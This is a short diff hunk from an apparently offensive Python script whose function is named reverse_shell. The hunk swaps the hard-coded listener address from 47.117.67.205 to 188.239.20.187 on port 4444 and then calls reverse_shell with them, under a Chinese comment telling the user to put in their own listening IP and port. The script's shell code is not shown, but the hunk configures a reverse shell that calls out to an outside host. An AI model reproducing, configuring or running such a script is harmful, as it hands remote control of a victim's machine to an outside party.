@@ -29,6 +29,6 @@ def reverse_shell(ip, port):
 
 if __name__ == "__main__":
     # 替换为你自己的监听 IP 和端口
-    REMOTE_IP = "47.117.67.205"
+    REMOTE_IP = "188.239.20.187"
     REMOTE_PORT = 4444
     reverse_shell(REMOTE_IP, REMOTE_PORT)
